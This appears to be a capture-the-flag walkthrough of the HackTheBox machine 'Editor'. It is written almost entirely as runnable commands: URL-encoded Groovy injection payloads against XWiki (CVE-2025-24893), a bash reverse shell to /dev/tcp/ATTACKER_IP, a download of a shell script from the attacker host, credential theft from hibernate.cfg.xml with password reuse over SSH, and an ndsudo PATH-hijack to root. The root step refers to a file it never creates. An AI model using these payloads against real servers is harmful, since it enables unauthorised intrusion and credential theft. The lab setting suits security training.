## 📝 Description

This walkthrough details the exploitation of the HackTheBox machine
**Editor**, which runs XWiki and contains a privilege escalation vector
via `ndsudo` PATH hijacking. The steps cover enumeration, remote code
execution (RCE), lateral movement, and privilege escalation to root.

------------------------------------------------------------------------

## 1. Enumeration

Initial port scan:

``` bash
nmap -p- -sV 10.10.11.80
```

**Results:**

    22/tcp   open  ssh
    80/tcp   open  http
    8080/tcp open  http

Port 80 redirects to **editor.htb**, and port 8080 is running **XWiki
15.10.8**.

------------------------------------------------------------------------

## 2. Initial Foothold - XWiki RCE (CVE-2025-24893)

Verify RCE using the SolrSearch endpoint:

``` bash
curl -i "http://10.10.11.80:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7D'whoami'.execute().text%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D"
```

**Output:**

    xwiki

Confirmed RCE.

### Stage 1: Host reverse shell script

On attacker machine:

``` bash
cat <<'EOF' > shell.sh
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF

chmod +x shell.sh
python3 -m http.server 8000
```

### Stage 2: Download shell script on target

``` bash
curl -i "http://10.10.11.80:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7D'curl%20-o%20/tmp/shell.sh%20http://ATTACKER_IP:8000/shell.sh'.execute().text%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D"
```

### Stage 3: Execute the reverse shell

Start listener:

``` bash
nc -lvnp 4444
```

Trigger the script:

``` bash
curl -i "http://10.10.11.80:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7D'bash%20/tmp/shell.sh'.execute().text%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D"
```

You get a reverse shell as `xwiki`.

------------------------------------------------------------------------

## 3. User Privilege Escalation (to oliver)

Find database credentials:

``` bash
grep -i password /usr/lib/xwiki/WEB-INF/hibernate.cfg.xml
```

**Output:**

``` xml
<property name="hibernate.connection.password">theEd1t0rTeam99</property>
```

Switch to `oliver` via SSH:

``` bash
ssh oliver@10.10.11.80
# Password: theEd1t0rTeam99
```

Read the user flag:

``` bash
cat ~/user.txt
```

**Output:**

    f253a<REDACTED>
------------------------------------------------------------------------

## 4. Root Privilege Escalation (ndsudo → nvme hijack)

Locate `ndsudo`:

``` bash
find / -name ndsudo 2>/dev/null
```

**Output:**

    /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo

Create fake `nvme` binary:

``` bash
cp /tmp/nvme /tmp/nvme-list
chmod +x /tmp/nvme-list
export PATH=/tmp:$PATH
```

Run with `ndsudo`:

``` bash
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

You now have a root shell.

------------------------------------------------------------------------

## 5. Root Flag

Switch to `/root` and grab the flag:

``` bash
cd /root
cat root.txt
```

------------------------------------------------------------------------

## 6. Flags

    User: <REDACTED>
    Root: <REDACTED>

------------------------------------------------------------------------

## ✅ Summary

-   **XWiki RCE (CVE-2025-24893)** → Remote shell as `xwiki`
-   Extracted password from `hibernate.cfg.xml` → SSH to `oliver`
-   Exploited `ndsudo` via PATH hijacking → Root shell
